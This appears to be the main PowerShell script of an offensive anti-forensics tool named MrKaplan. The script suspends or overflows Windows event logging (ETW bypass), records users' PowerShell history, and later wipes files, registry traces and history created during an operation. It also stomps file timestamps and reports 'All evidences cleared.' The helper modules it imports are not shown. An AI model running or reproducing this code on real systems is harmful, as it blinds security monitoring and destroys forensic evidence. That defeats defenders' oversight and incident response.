param (
    [Parameter(Mandatory=$true)]
    [String]
    $operation,

    [String]
    $etwBypassMethod,

    [String]
    $stompedFilePath,

    [String[]]
    $users
)

Import-Module .\Modules\Registry.psm1
Import-Module .\Modules\Files.psm1
Import-Module .\Modules\Eventlogs.psm1
Import-Module .\Modules\Utils.psm1

$PSDefaultParameterValues['*:Encoding'] = 'utf8'
$usage = "`n[*] Possible Usage:`n`n[*] Show help message:`n`t.\MrKaplan.ps1 help`n`n[*] For config creation and start:`n`t.\MrKaplan.ps1 begin`n`t.\MrKaplan.ps1 begin -Users Reddington,Liz`n`t.\MrKaplan.ps1 begin -Users Reddington`n`t.\MrKaplan.ps1 begin -EtwBypassMethod overflow`n`n[*] For cleanup:`n`t.\MrKaplan.ps1 end`n`n[*] To save file's timestamps:`n`t.\MrKaplan.ps1 timestomp C:\path\to\file`n`n"

if (Test-Path "banner.txt") {
    $banner = Get-Content -Path "banner.txt" -Raw
    Write-Host $banner
}

function New-Config {
    param (
        [String[]]
        $users,

        [String]
        $etwBypassMethod
    )
    $configFile = @{}

    # Stopping the event logging.
    Write-Host "[*] Stopping event logging..." -ForegroundColor Blue

    if ($etwBypassMethod -eq "overflow") {
        Write-Host "[*] This method won't allow any regular user to log in until you end MrKaplan." -ForegroundColor Yellow

        if ($(Read-Host "Are you sure? [y/n]") -eq "y") {
            $etwMetadata = Get-EventLogsSettings

            if ($etwMetadata.Count -eq 0) {
                return $false
            }
            
            $configFile["EventLogSettings"] = $etwMetadata
            if (!$(Clear-EventLogging)) {
                return $false
            }
        }
        else {
            Write-Host "[-] Exiting..." -ForegroundColor Red
            return $false
        }
    }
    elseif ($etwBypassMethod -eq "suspend" -or $etwBypassMethod -eq "") {
        $etwMetadata = Invoke-SuspendEtw

        if ($etwMetadata.Count -eq 0) {
            return $false
        }

        $configFile["EventLogSettings"] = $etwMetadata[1]
    }
    else {
        Write-Host "[-] Unknown ETW patching method, exiting..." -ForegroundColor Red
        return $false
    }

    Write-Host "[+] Stopped event logging." -ForegroundColor Green
    Write-Host "[*] Creating the config file..." -ForegroundColor Blue

    if ($users) {
        $users.Add($env:USERNAME)
    }
    else {
        $users = @($env:USERNAME)
    }
    
    # Saving current time.
    $configFile["time"] = Get-Date -Format "dddd MM/dd/yyyy HH:mm K"

    # Saving user data.
    foreach ($user in $users) {
        $powershellHistoryFile = "C:\Users\$($user)\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"

        if (Test-Path $powershellHistoryFile) {
            $powershellHistory = [Convert]::ToBase64String([IO.File]::ReadAllBytes($powershellHistoryFile))
        }
        else {
            $powershellHistory = ""
        }

        $configFile[$user] = @{}
        $configFile[$user]["PSHistory"] = $powershellHistory
    }

    # Dumping the data to json file.
    if (Test-Path "MrKaplan-Config.json") {
        Write-Host "[-] Config file already exists, please delete the current and rerun." -ForegroundColor Red
        return $false
    }

    $configFile | ConvertTo-Json | Out-File "MrKaplan-Config.json"    
    return $true
}

function Clear-Evidence {
    $result = $true

    if (!(Test-Path "MrKaplan-Config.json")) {
        Write-Host "[-] Failed to find config file, re-run the program with begin command." -ForegroundColor Red
        return $false
    }

    # Parsing the config file.
    $configFile = Get-Content "MrKaplan-Config.json" | ConvertFrom-Json | ConvertTo-Hashtable
    
    if (!$configFile) {
        Write-Host "[-] Failed to parse config file." -ForegroundColor Red
        return $false
    }

    # Running the modules on each user.
    Write-Host "[*] Cleaning logs..." -ForegroundColor Blue
    $users = New-Object Collections.Generic.List[String]

    if (!$($configFile.Contains("time"))) {
        Write-Host "[-] Invalid config file structure." -ForegroundColor Red
        return $false
    }

    Invoke-StompFiles $configFile["files"]

    foreach ($user in $configFile.Keys) {
        if ($user -eq "time" -or $user -eq "EventLogSettings") {
            continue
        }

        $users.Add($user)
        Clear-Files $configFile["time"] $configFile[$user]["PSHistory"] $user
    }

    if (!$(Clear-Registry $configFile["time"] $users)) {
        Write-Host "[-] Failed to cleanup the registry." -ForegroundColor Red
        $result = $false
    }

    # Restoring the event logging.
    Write-Host "[*] Restoring event logging..." -ForegroundColor Blue

    if ($configFile.Contains("EventLogSettings")) {
        if (!$(Invoke-RestoreEtw $configFile["EventLogSettings"])) {
            Write-Host "[-] Failed to restore the eventlogging." -ForegroundColor Red
            $result = $false
        }
    }
    
    if ($result) {
        Write-Host "[+] Restored! Be careful with your actions now." -ForegroundColor Green
    }
    else {
        Write-Host "[!] Finished with partial restoration." -ForegroundColor Yellow
    }

    return $result
}

if ($operation -eq "begin") {
    if (New-Config $users $etwBypassMethod) {
        Write-Host "`n[+] Saved required information!`n[+] You can do your operations." -ForegroundColor Green
    }
    else {
        Write-Host "`n[-] Failed to create config file." -ForegroundColor Red
    }
}
elseif ($operation -eq "end") {
    if (Clear-Evidence) {
        Write-Host "`n[+] All evidences cleared!" -ForegroundColor Green
    }
    else {
        Write-Host "`n[-] Failed to clear all evidences." -ForegroundColor Red
    }
}
elseif ($operation -eq "timestomp") {
    if (Invoke-LogFileToStomp $stompedFilePath) {
        Write-Host "`n[+] Saved file's timestamps." -ForegroundColor Green
    }       
    else {
        Write-Host "`n[-] Failed to save timestamps." -ForegroundColor Red
    }
}
elseif ($operation -eq "help") {
    Write-Host $usage -ForegroundColor Blue
}
else {
    Write-Host "`n[!] Invalid Usage!" -ForegroundColor Red
    Write-Host $usage -ForegroundColor Blue
}